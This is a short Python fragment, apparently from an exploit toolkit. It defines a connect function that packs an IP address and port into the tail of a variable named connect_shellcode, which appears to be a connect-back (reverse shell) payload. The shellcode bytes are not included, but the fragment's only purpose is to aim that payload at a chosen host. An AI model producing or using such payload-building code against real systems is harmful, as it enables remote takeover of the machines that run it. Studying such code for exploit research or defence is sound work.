
def connect(ip, port):
	import struct
	import socket
	params = struct.pack("!H", port) + socket.inet_aton(ip)
	return connect_shellcode[:-8] + params

